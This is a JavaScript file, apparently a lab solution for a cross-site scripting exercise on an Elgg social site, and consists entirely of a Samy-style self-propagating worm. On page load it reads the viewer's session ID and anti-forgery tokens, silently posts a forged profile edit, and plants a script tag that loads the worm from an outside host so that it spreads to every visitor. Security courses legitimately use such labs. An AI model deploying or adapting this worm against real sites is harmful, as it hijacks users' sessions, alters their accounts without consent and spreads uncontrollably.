window.onload = function(){
  var wormCode = encodeURIComponent(
    "<script type=\"text/javascript\"" +
    "id=\"worm\"" +
    "src=\"www.example.com/xss_worm.js\">" +
    "</" +
    "script>"
  );

  var guid  = "&guid=" + elgg.session.user.guid;
  var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var name  = "&name=" + elgg.session.user.name;
  var desc  = "&description=Samy is my hero" +
              wormCode +
              "&accesslevel[description]=2";

  // Construct the content of your url.
  var sendurl = "http://www.xsslabelgg.com/action/profile/edit";    //FILL IN
  var content = ts + token + name + desc + guid;    //FILL IN
  var samyGuid = "47";   //FILL IN


  if (elgg.session.user.guid != samyGuid){
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
}
